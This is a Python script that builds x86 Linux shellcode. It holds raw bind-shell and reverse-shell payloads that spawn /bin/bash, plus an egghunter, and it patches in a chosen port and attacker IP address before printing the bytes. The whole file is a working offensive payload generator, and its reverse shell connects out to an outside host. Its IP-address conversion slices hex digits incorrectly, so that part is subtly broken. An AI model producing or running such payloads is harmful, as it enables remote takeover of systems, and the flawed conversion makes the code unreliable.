#!/usr/bin/python3

import argparse
import socket

parser = argparse.ArgumentParser()
parser.add_argument("payload", help="Choose 'bind' for a bind shell or 'reverse' for a reverse shell")
parser.add_argument("address", help="IP address to connect to")
parser.add_argument("port", help="Port number to connect to")
args = parser.parse_args()

reverseshell = b"\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\x83\xc1\x01\x31\xd2\xcd\x80\x89\xc7\x31\xc0\x50\x50\x68\x7f\x00\x00\x01\x66\x68\x1b\x59\x66\x6a\x02\x66\xb8\x6a\x01\x89\xfb\x89\xe1\x83\xc2\x10\xcd\x80\x31\xc0\x83\xc0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80\x31\xc0";

bindshell = b"\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\x83\xc1\x01\x31\xd2\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x66\x68\x1b\x59\x66\x6a\x02\x66\xb8\x69\x01\x89\xfb\x89\xe1\x83\xc2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xfb\x31\xc9\x83\xc1\x05\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\x31\xc0\x83\xc0\x3f\x89\xf3\x31\xc9\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80\x31\xc0"

egghunter = b"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"

if (args.payload != 'bind' and args.payload != 'reverse'):
    print("Choose 'bind' for a bind shell or 'reverse' for a reverse shell")
    exit(1) 
    
if (args.payload == 'bind'):
    shellcode = bindshell
    args.address = '127.0.0.1'
elif (args.payload == 'reverse'):
    shellcode = reverseshell

# get the port in little endian format 
res = format(int(args.port), '04x')
res1 = res[0:2]
res2 = res[2:]
portbytes = bytearray.fromhex(res1 + res2)

shellcode = shellcode.replace(b"\x1b\x59", portbytes)

if (args.payload == 'reverse'):
    # get the ip address in network byte order (big endian)
    # https://stackoverflow.com/questions/33244775/converting-ip-address-into-bytes-in-python
    ip_as_bytes = bytes(map(int, args.address.split('.'))).hex()
    byte1 = ip_as_bytes[0:1]
    byte2 = ip_as_bytes[1:2]
    byte3 = ip_as_bytes[2:3]
    byte4 = ip_as_bytes[3:]
    addressbytes = bytearray.fromhex(byte1 + byte2 + byte3 + byte4)
    shellcode = shellcode.replace(b"\x7f\x00\x00\x01", addressbytes)

newstr = ""
newstr += "\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50" # the key
i = 0
for char in shellcode.hex():
    if (i % 2 == 0):
        newstr += "\\x"
        newstr += char
    else:
        newstr += char
    i += 1
print("shellcode for {type} shell to {address}:{port}: ".format(type = args.payload, address = args.address, port = args.port))
print(newstr + '\n')

egghunterstr = ""
i = 0
for char in egghunter.hex():
    if (i % 2 == 0):
        egghunterstr += "\\x"
        egghunterstr += char
    else:
        egghunterstr += char
    i += 1
print("egghunter shellcode: ")
print(egghunterstr)




